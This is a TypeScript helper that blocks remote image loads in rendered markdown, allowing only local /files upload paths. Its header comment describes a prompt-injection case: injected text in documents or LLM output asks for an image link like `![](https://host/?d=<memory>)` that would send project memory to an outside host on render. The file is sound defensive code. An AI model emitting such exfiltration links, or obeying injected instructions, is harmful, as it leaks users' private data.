// Markdown reaches the screen from imported documents and from LLM output, and a
// prompt injection in either can ask for `![](https://host/?d=<memory>)`. An
// <img> fetches on render, so a remote src would send project content off the
// machine without a click. Only uploads served by the local API render as images;
// every other src (remote, relative, protocol-relative) is shown as a link.
//
// Kept free of React and of `window` so `node --test` can load it directly
// (frontend/test/markdownImage.test.ts).

// Upload names are a uuid plus an extension. Allowing only that alphabet, with no
// leading dot and no `%`, keeps out `..` and its percent-encoded forms, which the
// URL parser would resolve onto another loopback route.
const UPLOAD_PATH = /^\/files\/[\w-][\w.-]*$/;

// Returns the /files path to load, or null when the image must not be fetched.
export function markdownUploadPath(src: string | undefined): string | null {
  return src !== undefined && UPLOAD_PATH.test(src) ? src : null;
}
